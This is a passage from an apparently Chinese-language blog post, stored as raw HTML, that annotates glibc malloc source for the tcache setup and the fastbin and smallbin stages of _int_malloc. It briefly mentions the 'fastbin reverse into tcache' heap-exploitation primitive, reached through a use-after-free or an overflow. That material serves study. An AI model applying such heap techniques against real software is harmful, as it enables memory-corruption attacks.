memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//申请成功，初始化</span></span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先是arena_get获取arena，其宏定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;<span class="comment">//获取thread_arena，这个是一个全局变量，在ptmalloc_init被初始化成了 &amp;main_arena  \</span></span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line">，</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;					      \ <span class="comment">//如果ptr不为空，则调用__libc_lock_lock上锁</span></span></span><br><span class="line">      <span class="keyword">if</span> (ptr)								      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);					      \</span><br><span class="line">      <span class="keyword">else</span>								      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);				      \<span class="comment">//若ptr不为空，则调用arena_get2获取ptr</span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后调用<code>_int_malloc</code>获取一个内存(这个函数也是之后分析的重点，重中之重)，之后就是给tcache赋值，然后置零</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (victim)</span><br><span class="line">&#123;</span><br><span class="line">    tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">    <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把Tcache的初始化分析完之后我们再返回_libc_malloc中，然后是这句语句,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache <span class="comment">//判断返回的tc_idx是否合理，tcache是否存在，tcache相应的bin是否有free的chunk，如果是则调用tcache_get获取</span></span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    victim = tcache_get (tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果tcache没有的话，则我们就要调用<code>_int_malloc</code>获取内存(其实观察<code>_libc_malloc</code>后面还有对是否单线程等的判断，不过最终还是调用<code>_int_malloc</code>函数进行获取chunk)</p>
<p>那么接下来我们着重整理一下<code>_int_malloc</code>的流程，这个函数比<code>_libc_malloc</code>要复杂许多，归根结底<code>__libc_malloc</code>只是做了一些检查初始化，以及从tcache bin中检查是否有合适块的操作，如果没有的话最后还是调用<code>_int_malloc</code>，去找其他bins中的chunk</p>
<h5 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h5><p>这个函数的实现差不多有700行，全贴上来有点过于低能了。所以就按照流程逐步的分析。大致来说，<code>_int_malloc</code>在接收到分配请求时，会依次从<code>fastbin</code>、<code>small bin</code>中检索，如果大小处于<code>large bin</code>当中，则会首先检查是否有fastchunk,如果有则调用<code>malloc_consolidate</code>进行堆块的前向和后向合并。然后再到<code>unsorted bin</code>中检索，若没有则再到对应size的<code>large bin</code>中检索，如果还是没有则到其他size的<code>large bin</code>中检索。如果最终还是没有，则需要到<code>top chunk</code>中检索。以下将按顺序整理malloc的整个流程。</p>
<h6 id="声明与初始化阶段"><a href="#声明与初始化阶段" class="headerlink" title="声明与初始化阶段"></a>声明与初始化阶段</h6><p>在函数的开头进写了一些声明与初始化操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size returns false for request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//如果size不合理，返回错误</span></span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;nb))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">    <span class="comment">//如果没有用到的arenas，调用sysmalloc从mmap得到一个chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里定义了一个宏，方便我们在多线程的时候保持数据一致性。其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">      pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="fastbin阶段"><a href="#fastbin阶段" class="headerlink" title="fastbin阶段"></a>fastbin阶段</h6><p>如果大小小于get_max_fast()，则我们会首先在fastbin中进行检索</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">  &#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">      &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>总体流程可以分为两步:</p>
<ul>
<li>找chunk</li>
<li>fastbin reverse into tcache</li>
</ul>
<p>首先根据大小找到对应fastbin的index，然后获取fastbinY指针 fb取其第一个chunk为victim</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">idx = fastbin_index (nb);</span><br><span class="line">mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">mchunkptr pp;</span><br><span class="line">victim = *fb;</span><br></pre></td></tr></table></figure>
<p>如果这个victim不为NULL(也就是说对应fastbin中有空闲的chunk)则进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim))) <span class="comment">//检查是否对齐</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//根据多线程与否，取出fastbin第一个chunk，然后将fastbin设置为第二个chunk(就是把第一个链表元素取出的操作)</span></span><br><span class="line">  *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  REMOVE_FB (fb, pp, victim);</span><br><span class="line"><span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">  &#123; <span class="comment">//取出之后检查该chunk的size是否符合位于当前fastbin的index(也就是检查它的size是否被篡改了)</span></span><br><span class="line">    <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">    check_remalloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure>
<p>然后便是喜闻乐见的<code>fastbin reverse into tcache</code>的操作,这个在之前的博客里面分析过。如果我们有一个UAF或者溢出，便可以利用它进行在任意地址上写一个堆地址(如果没有指针加密操作的话)。我们在这里再分析一下他的操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//首先判断tcache是否错在，并且nb对应的idx小于 mp_.tcache_bins</span></span><br><span class="line">  &#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">          <span class="comment">//把剩余的fastbin中的东西挪到tcache中</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">      &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>) <span class="comment">//循环终止的条件可能有两个:1、该大小的tcache bin满了 2、fastbin 空了</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))<span class="comment">//检查对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (tc_victim-&gt;fd); <span class="comment">//取出第一个chunk为tc_victim</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);<span class="comment">//调用tcache_put把tc_victim放入tc_idx对应的tcache bin中</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>最后将第一步得到的chunk指针进行一个chunk2mem操作，然后调用alloc_pertub，将其内容清空之后返回给用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
<h6 id="smallbin阶段"><a href="#smallbin阶段" class="headerlink" title="smallbin阶段"></a>smallbin阶段</h6><p>如果nb的范围在smallbin里面，则和刚刚一样进行一个搜索，同时也有一个类似<code>fastbin reverse into tcache</code>的操作。但是和在fastbin不同，smallbin是以双向链表组织的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">      stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">        &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (tc_victim);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先时根据大小获取目标small bin的idx，获取bin。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br></pre></td></tr></table></figure>
<p>判断该bin是否为空，如果不为空则进一步进行一个取出的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">bck = victim-&gt;bk; <span class="comment">//victim是该bin中最末尾的chunk，然后bck是它在该bin中的前一个chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//判断指针是否有错误，这里判断bck的后向chunk是否为victim</span></span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置inuse位</span></span><br><span class="line">bin-&gt;bk = bck; <span class="comment">//更改bin的前向与bck的后向。原本的victim被取出，bck变成了该bin中的最后一个chunk</span></span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim); <span class="comment">//设置no_main_arena位</span></span><br><span class="line">check_malloced_chunk (av, victim, nb);    </span><br></pre></td></tr></table></figure>
<p>然后就是对该small bin中剩下的chunk放入相应idx的tcache bin中,这个操作和之前的fastbin时的操作没有什么区别，只不过从单项链表变成了双向链表而已，以及多了一些chunk标志位的设置。这里不再赘述</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">      stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">        &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span 